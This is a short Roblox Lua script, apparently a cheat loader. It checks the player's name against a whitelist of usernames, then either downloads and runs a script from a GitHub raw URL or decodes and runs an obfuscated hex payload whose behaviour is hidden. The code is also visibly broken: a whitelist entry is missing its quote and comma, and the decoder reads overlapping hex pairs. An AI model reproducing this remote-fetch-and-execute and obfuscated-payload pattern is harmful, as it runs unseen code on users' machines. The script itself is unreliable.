local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local Username = LocalPlayer.Name

local Whitelist = {
    "ggpp_xx
    "ggpp_cc",
    "cwm204518",
    "xmfeng1111",
    "nbfhjj125",
    "wps8866",
    "EFreeDCcZaI",
    "luoyj1055",
    "qin147807",
    "xver0921",
    "299286wn",
    "lingzijiangya",
    "mmnfsch",
}

local function Notify(title, text, duration)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = duration or 3
    })
end

local function IsWhitelisted(name)
    for _, v in ipairs(Whitelist) do
        if v == name then
            return true
        end
    end
    return false
end

local function WhitelistedScript()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ggpp4088/roblox/refs/heads/main/kts.lua'))("")
end

local function NoWhitelistScript()
    local h="671468E355D9BAC4E8C0E4B08B23D3D4B0D7B8B840D3A004F5F5A15094E3C290F4C0E4B09F23A5B0E59C4E19F39D18D595B59B39B2F3D03D8C0F3A8B64B0F3E6E1B063D3E0D8B3E3F4C4991C4E2D1E3C6C3B02A9B76F6E6D4E29498E6D50D6D1E29490C2E7D3C8D1E4961C2D6C294F0D6D6C6C1D5E3C0B0C4D3E2C393B1C2E1A1903C4D590E3C0E4E6E0C693E1F4C6E2B0D4B3E29498E4B2C0F3C0D4B6E0C693E0B4C1F3E29498";local k1={83,71,45,116,52,114,70,103,55,119,80,100,51,108,75,98};local k3=42;local b={};for i=1,#h,2 do local lo=tonumber(h:sub(i,i+1),16);local hi=tonumber(h:sub(i+1,i+2),16);b[#b+1]=(hi*16)+lo end;for i=1,#b do b[i]=(b[i]-k3-i+2560)%256 end;local r={};for i=#b,1,-1 do r[#r+1]=b[i] end;local d="";for i=1,#r do d=d..string.char((r[i]-k1[((i-1)%#k1)+1]+256)%256)end;loadstring(d)()
end

if IsWhitelisted(Username) then
    WhitelistedScript()
else
    NoWhitelistScript()
end